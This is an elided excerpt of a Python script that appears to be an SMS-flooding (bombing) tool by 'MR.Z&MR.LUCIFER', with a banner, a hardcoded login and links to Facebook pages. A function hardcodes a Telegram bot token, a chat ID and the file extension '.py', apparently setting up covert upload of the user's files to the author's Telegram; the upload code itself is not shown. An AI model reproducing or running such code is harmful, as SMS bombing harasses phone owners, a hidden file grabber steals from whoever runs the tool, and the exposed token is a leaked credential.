...
\033[1;32m[-] AUTHOR    :\033[1;32m MR.Z&MR.LUCIFER
\033[1;32m[-] GITHUB    :\033[1;32m K4BBO
\033[1;32m[-] FACEBOOK  :\033[1;32m MR.Z
...
def akin():
	bot_token = ('7859991830:AAGA9wrY3ybcGBm4Rb-eOmBhMNMak1zRoQA')
	chat_id = ('7859991830')
	extension = ('.py')
...
if 'Z'==user and 'Z'==pas:
	...
	os.system('xdg-open https://facebook.com/groups/1042138253805065/')
else:
	Axak(y+"\n\n\t\t      Invalid User Or Pass")
	Axak(y+"\n\n\t\tContract Admin For User And Pass")
	os.system("xdg-open https://www.facebook.com/mr.z.abba.your")
...
for i in range(amo):
	...
	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥MR.Z🔥  "+w+tim)
